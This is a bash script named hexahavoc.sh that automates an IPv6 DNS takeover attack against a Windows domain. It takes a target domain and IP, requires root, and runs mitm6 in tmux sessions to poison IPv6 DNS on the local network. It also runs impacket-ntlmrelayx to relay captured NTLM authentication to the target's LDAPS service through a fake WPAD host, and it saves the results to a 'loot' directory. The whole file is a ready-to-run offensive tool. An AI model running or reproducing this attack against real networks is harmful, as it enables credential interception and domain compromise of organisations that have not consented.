#!/bin/bash
set -euo pipefail

# ===============================================================
# hexahavoc.sh - IPv6 DNS Takeover Automation Script
# ---------------------------------------------------------------
# Author: Howell King Jr. | Github: https://github.com/sp3ttr0
# ===============================================================

# Define color variables
RED="\033[31m"
BLUE="\033[34m"
GREEN="\033[32m"
YELLOW="\033[33m"
CYAN="\033[36m"
RESET="\033[0m"

# Initialize variables with default values
target_domain=""
target_ip=""
interface="eth0"
verbose=0
silent=0
session_name="ipv6_dns_takeover"
loot_dir="dumps"

# Check if a command exists
check_command() {
  if ! command -v "$1" &> /dev/null; then
    echo -e "${RED}Error: $1 is not installed. Please install it before running this script.${RESET}"
    exit 1
  fi
}

# Print usage information
usage() {
  echo -e "${CYAN}Usage: $0 -d <target_domain> -t <target_ip> [-i <interface>] [-l <loot_dir>] [-v] [-s]${RESET}"
  echo -e "${YELLOW}Options:${RESET}"
  echo -e "  -d  Specify the target domain"
  echo -e "  -t  Specify the target IP"
  echo -e "  -i  Specify the network interface (default: eth0)"
  echo -e "  -l  Specify loot output directory (default: dumps)"
  echo -e "  -v  Enable verbose logging"
  echo -e "  -s  Enable silent mode (suppress console output)"
  exit 1
}

# Check dependencies
echo -e "${CYAN}Checking dependencies...${RESET}"
check_command "tmux"
check_command "mitm6"
check_command "impacket-ntlmrelayx"

# Banner function
banner() {
  echo -e "${RED}"
  echo -e "                                                                       "
  echo -e " .__                             .__                                   "
  echo -e " |  |__    ____  ___  ________   |  |__  _____  ___  __ ____    ____   "
  echo -e " |  |  \ _/ __ \ \  \/  /\__  \  |  |  \ \__  \ \  \/ //  _ \ _/ ___\  "
  echo -e " |   Y  \\  ___/  >    <  / __ \_|   Y  \ / __ \_\   /(  <_> )\  \___  "
  echo -e " |___|  / \___  >/__/\_ \(____  /|___|  /(____  / \_/  \____/  \___  > "
  echo -e "      \/      \/       \/     \/      \/      \/                   \/  "
  echo -e "${YELLOW}                                by sp3ttro                             "
  echo -e "                                                                       "
  echo -e "                                                                       "
  echo -e "${RESET}"
}                                                      

# Parse command-line arguments
while getopts ":d:t:i:l:vs" opt; do
  case "$opt" in
    d) target_domain="$OPTARG" ;;
    t) target_ip="$OPTARG" ;;
    i) interface="$OPTARG" ;;
    l) loot_dir="$OPTARG" ;;
    v) verbose=1 ;;
    s) silent=1 ;;
    \?) usage ;;
  esac
done

# Ensure required arguments are provided
if [ -z "$target_domain" ] || [ -z "$target_ip" ]; then
  echo -e "${RED}Error: Both -d (target_domain) and -t (target_ip) arguments are required.${RESET}"
  usage
fi

# Validate target domain
if ! [[ "$target_domain" =~ ^[a-zA-Z0-9.-]+$ ]]; then
  echo -e "${RED}Error: Invalid domain format.${RESET}"
  exit 1
fi

# Validate target IP (basic check for IPv4/IPv6)
validate_ip() {
  if ! getent hosts "$1" >/dev/null 2>&1; then
    echo -e "${RED}Invalid or unresolvable IP${RESET}"
    exit 1
  fi
}

validate_ip "$target_ip"

# Check if target IP is reachable
ping -c 1 -W 2 "$target_ip" &>/dev/null || {
  echo -e "${RED}Error: Target IP is not reachable.${RESET}"
  exit 1
}

cleanup() {
  if [[ $? -ne 0 ]]; then
    echo -e "${YELLOW}Cleaning up session...${RESET}"
    tmux kill-session -t "$session_name" 2>/dev/null || true
  fi
}

trap cleanup EXIT

# Root privilege check
if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}Error: This script must be run as root.${RESET}"
  exit 1
fi

# Create loot directory if it doesn't exist
if [ ! -d "$loot_dir" ]; then
  mkdir -p "$loot_dir"
else
  echo -e "${YELLOW}Warning: Loot directory '$loot_dir' already exists. Results may be overwritten.${RESET}"
fi

# Suppress console output if silent mode is enabled
log_file="$loot_dir/hexahavoc_$(date +%F_%H-%M-%S).log"

exec > >(tee -a "$log_file") 2>&1
[[ "$silent" -eq 1 ]] && exec >/dev/null

# Show the banner
banner

# Enable verbose logging if requested
if [ "$verbose" -eq 1 ] && [ "$silent" -eq 1 ]; then
  echo -e "${RED}Error: -v and -s flags cannot be used together.${RESET}"
  exit 1
fi

# Check if tmux session exists
if tmux has-session -t "$session_name" 2>/dev/null; then
  echo -e "${YELLOW}[!] Tmux session '${session_name}' already exists.${RESET}"

  echo -e "${BLUE}Do you want to:${RESET}"
  echo -e "  [a] Attach to existing session"
  echo -e "  [k] Kill and restart session"
  read -rp "$(echo -e "${YELLOW}Choose [a/k]: ${RESET}")" user_choice

  case "$user_choice" in
    [aA])
      echo -e "${GREEN}[*] Attaching to existing tmux session...${RESET}"
      tmux -CC attach-session -t "$session_name"
      exit 0
      ;;
    [kK])
      echo -e "${RED}[*] Killing existing tmux session...${RESET}"
      tmux kill-session -t "$session_name"
      echo -e "${GREEN}[*] Session killed. Exiting.${RESET}"
      exit 0
      ;;
    *)
      echo -e "${RED}[!] Invalid choice. Exiting.${RESET}"
      exit 1
      ;;
  esac
fi

# Create a new tmux session
echo -e "${CYAN}Creating a new tmux session named '$session_name'...${RESET}"
tmux new-session -d -s "$session_name"

# Function to start a tmux window
start_tmux_window() {
  local session_name=$1
  local window_name=$2
  local command=$3
  tmux new-window -t "$session_name" -n "$window_name" || {
    echo "Failed to create window"
    exit 1
  }
  tmux send-keys -t "$session_name:$window_name" "bash -lc \"$command\"" C-m
}

# Start mitm6 in tmux session
echo -e "${CYAN}Starting mitm6 on interface $interface for domain $target_domain...${RESET}"
start_tmux_window "$session_name" "mitm6" "mitm6 -i \"$interface\" -d \"$target_domain\"" || {
  echo -e "${RED}Failed to start mitm6.${RESET}"
  exit 1
}

# Start impacket-ntlmrelayx in tmux session
echo -e "${CYAN}Starting impacket-ntlmrelayx...${RESET}"
start_tmux_window "$session_name" "impacket-ntlmrelayx" "impacket-ntlmrelayx -6 -t ldaps://$target_ip -wh fakewpad.$target_domain -l $loot_dir" || {
  echo -e "${RED}Failed to start impacket-ntlmrelayx.${RESET}"
  exit 1
}

# Attach to the tmux session
echo -e "${GREEN}Attaching to the tmux session '$session_name'...${RESET}"
tmux -CC attach-session -t "$session_name"

# Disable verbose logging
if [ "$verbose" -eq 1 ]; then
  echo -e "${YELLOW}Disabling verbose mode...${RESET}"
  set +x
fi

exit 0
